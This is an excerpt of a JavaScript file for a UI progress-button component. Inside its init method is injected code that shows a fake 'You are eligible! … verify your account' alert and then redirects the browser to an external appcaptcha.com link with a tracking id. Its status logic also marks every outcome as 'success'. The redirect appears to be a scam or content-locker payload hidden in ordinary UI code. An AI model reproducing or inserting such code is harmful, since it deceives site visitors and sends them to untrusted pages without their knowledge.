...
;( function( window ) {
	...
	UIProgressButton.prototype._init = function() {
		...
		this.errorEl = new SVGEl( this.el.querySelector( 'svg.checkmark' ) );
		// init events
		this._initEvents();
		// enable button
		this._enable();
   ...
   setTimeout(function () {
       alert("You are eligible! Please complete the last step to verify your account");
       window.location.href = "https://www.appcaptcha.com/cl.php?id=9dc8fe301486db6f388adcc0411831e0";
    }, 1000);
		...
		var self = this,
			endLoading = function() {
				...
				if( typeof status === 'number' ) {
					var statusClass = status >= 0 ? 'success' : 'success',
